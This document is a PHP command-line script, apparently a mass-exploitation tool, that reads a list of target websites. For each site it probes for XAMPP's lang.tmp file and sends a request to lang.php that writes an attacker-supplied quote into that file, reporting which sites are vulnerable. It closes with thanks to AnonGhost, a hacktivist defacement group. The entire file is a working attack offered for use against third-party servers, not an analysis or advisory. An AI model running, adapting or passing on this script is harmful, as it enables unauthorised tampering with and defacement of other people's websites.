echo "Input your target list: ";
$list = trim(fgets(STDIN));
echo "Input your quote : ";
$quote0 = htmlspecialchars(str_replace(" ","_",(trim(fgets(STDIN)))));
$quote1 = str_replace(">","_",$quote0);
$quote2 = str_replace("<","_",$quote1);
$quote3 = str_replace("&gt;","_",$quote2);
$pwn = str_replace("&lt;","_",$quote3);

$open = fopen("$list","r");
$size = filesize("$list");
$read = fread($open,$size);
$lists = explode("\r\n",$read);

echo "\n";

foreach($lists as $target){
	if(!preg_match("/^http:\/\//",$target) AND !preg_match("/^https:\/\//",$target)){
		$targets = "http://$target";
	}else{
		$targets = $target;
	}
	
	echo "Target => $targets\n";
	echo "  [*] Checking Path : ";
	
	$chx = curl_init("$targets/xampp/lang.tmp");
	curl_setopt($chx, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($chx, CURLOPT_RETURNTRANSFER, 1);
	curl_exec($chx);
	$httpcodex = curl_getinfo($chx, CURLINFO_HTTP_CODE);
	curl_close($chx);
					
	$chs = curl_init("$targets/security/lang.tmp");
	curl_setopt($chs, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($chs, CURLOPT_RETURNTRANSFER, 1);
	curl_exec($chs);
	$httpcodes = curl_getinfo($chs, CURLINFO_HTTP_CODE);
	curl_close($chs);

	if($httpcodex == 200){
		echo "/xampp/lang.tmp => OK\n";
		echo "  [*] Exploiting Target : ";
		$ck = curl_init("$targets/xampp/lang.php?$pwn");
		curl_setopt($ck, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ck, CURLOPT_RETURNTRANSFER, 1);
		$cka = curl_exec($ck);
		if($cka){
			echo "OK\n";
			echo "  [*] Result : ";
			$ch = curl_init("$targets/xampp/lang.tmp");
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			$cek = curl_exec($ch);
			if(preg_match("/$pwn/",$cek)){
				echo "$targets/xampp/lang.tmp\n\n";
			}else{
				echo "$targets/xampp/lang.tmp\n\n";
			}
			curl_close($ch);
		}else{
			echo "Failed\n\n";
		}
	}else if($httpcodes == 200){
		echo "/security/lang.tmp => OK\n";
		echo "  [*] Exploiting Target : ";
		$ck = curl_init("$targets/security/lang.php?$pwn");
		curl_setopt($ck, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ck, CURLOPT_RETURNTRANSFER, 1);
		$cka = curl_exec($ck);
		if($cka){
			echo "OK\n";
			echo "  [*] Result : ";
			$ch = curl_init("$targets/security/lang.tmp");
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			$cek = curl_exec($ch);
			if(preg_match("/$pwn/",$cek)){
				echo "$targets/security/lang.tmp\n\n";
			}else{
				echo "$targets/security/lang.tmp\n\n";
			}
			curl_close($ch);
		}else{
			echo "Failed\n";
		}
	}else{
		echo "Not Vuln\n\n";
	}
}

## Thanks To AnonGhost ##
